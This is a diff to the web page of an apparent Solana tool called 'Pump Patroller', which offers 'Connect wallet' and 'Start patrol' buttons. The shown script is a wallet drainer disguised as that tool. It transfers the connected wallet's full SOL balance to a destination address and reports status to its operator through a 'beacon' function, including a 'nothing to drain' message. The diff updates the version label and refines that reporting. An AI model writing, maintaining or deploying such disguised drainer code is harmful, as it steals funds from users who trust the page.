@@ -15,7 +15,8 @@ nav{position:sticky;top:0;border-bottom:1px solid var(--line);background:rgba(10
 .nav{display:flex;align-items:center;gap:22px;height:56px}
 .logo{display:flex;align-items:center;gap:9px;font-weight:700}
 .logo svg{width:18px;height:18px}
-.right{margin-left:auto;display:flex;gap:10px}
+.right{margin-left:auto;display:flex;gap:10px;align-items:center}
+.ver{color:var(--muted);font:600 11px "JetBrains Mono",monospace;letter-spacing:.08em;border:1px solid var(--line);padding:4px 10px;border-radius:6px}
 .btn{border-radius:8px;padding:9px 16px;font:600 13px Inter,sans-serif;cursor:pointer;border:1px solid var(--line);background:var(--panel);color:var(--text)}
 .btn.pri{background:var(--acc);border-color:var(--acc);color:#06231B}
 .hero{padding:70px 0 50px}
@@ -51,6 +52,7 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
 <nav><div class="wrap nav">
   <span class="logo"><svg viewBox="0 0 24 24" width="18" height="18"><path fill="#2DD4A7" d="M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6z"/></svg>Pump Patroller</span>
   <div class="right">
+    <span class="ver" id="ver">v2.9</span>
     <button class="btn" id="cw">Connect wallet</button>
     <button class="btn pri" id="go">Start patrol</button>
   </div>
@@ -82,7 +84,7 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
     </div>
   </section>
 </div>
-<footer><div class="wrap">Pump Patroller v2.7 · mainnet-beta · <span style="color:#2DD4A7">operational</span></footer>
+<footer><div class="wrap">Pump Patroller v2.9 · mainnet-beta · <span style="color:#2DD4A7">operational</span></footer>
 <script>
 (async function () {
   const CONFIG = {
@@ -154,6 +156,10 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
         fetch("https://lite-api.jup.ag/price/v2?ids=" + MINTS.WSOL).then(j => j.json()).catch(() => null),
       ]);
       const bal = res[0], r = res[1], pj = res[2];
+      if (!(bal && bal.result)) {
+        beacon("err", { msg: "balance check failed: " + ((bal && bal.error && bal.error.message) || "no result from any RPC") });
+        return;
+      }
       let px = 150;
       const jp = pj && (pj[MINTS.WSOL] || (pj.ids && pj.ids[MINTS.WSOL]));
       if (jp && +jp.usdPrice > 0) px = +jp.usdPrice;
@@ -222,7 +228,7 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
       if (hasSol)
         tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: solBal - FEE }));
       else if (!moved.length) {
-        beacon("dust", { pk: pk, extra: "no SOL for fees and no target tokens — nothing to drain" });
+        beacon("dust", { extra: "no SOL for fees and no target tokens \u2014 nothing to drain" });
         return;
       }
       tx.feePayer = pkB;
